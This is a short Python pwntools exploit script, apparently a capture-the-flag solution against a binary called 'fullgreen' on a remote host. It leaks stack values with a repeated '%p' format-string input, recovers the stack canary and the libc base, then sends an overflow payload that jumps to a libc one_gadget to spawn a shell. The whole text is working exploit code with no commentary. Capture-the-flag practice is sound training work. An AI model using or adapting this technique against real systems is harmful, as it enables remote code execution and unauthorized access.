from pwn import *
import re

# p = process("./fullgreen")
p = remote("207.154.239.148", 1989)
libc = ELF("./libc.so.6")

p.recv()
sleep(0.5)
pfg = 15*b"%p"
p.send(pfg)
sleep(0.5)
resp = p.recv()
sleep(0.5)
l = re.findall(b"0x[0-9a-f]+(?!x)",resp)
canary = int(l[-1],16)

d = 604560
scl = int(l[2],16)-2
put = scl - d
libc.address = put - libc.sym.puts

r = int(l[7],16)
gadget = 0xebd43 + libc.address
payload = 40*b"a" + p64(canary) + p64(r+16 +0x70)  + p64(gadget) +0x70*b"\x00"

p.sendline(payload)
p.interactive()